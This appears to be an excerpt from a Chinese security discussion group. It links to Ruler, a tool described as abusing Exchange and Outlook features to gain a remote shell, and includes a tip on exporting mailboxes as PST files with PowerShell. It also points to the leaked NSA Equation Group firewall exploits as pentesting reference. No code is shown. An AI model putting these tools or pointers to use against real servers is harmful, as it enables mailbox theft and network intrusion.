[GitHub - sensepost/ruler: A tool to abuse Exchange services](https://github.com/sensepost/ruler)



"Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely."

通过 MAPI/HTTP 与 RPC/HTTP 协议。



...

<img src="https://file.xiaomiquan.com/89/da/89dac2fbbada82afb3c1152dd4f88d703c91d5f5cbd238debe3f749b98c36f68.jpg" width="25px"/> __Twi1ight__: 用powershell在exchange服务器上也可以直接导出pst文件，支持按时间段导出，这是官方自带的


...

---


## 边界设备安全



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:

> 匿名用户 提问：
你好，能不能分享一些关于边界设备安全的资料，例如路由器，防火墙这类设备的安全，以及如何基于这类设备进行渗透测试，谢谢


之前分享的知道创宇研发技能表里有列不少。渗透测试高姿势可以参考 NSA 方程式被泄露的那批防火墙 Exploits。



---
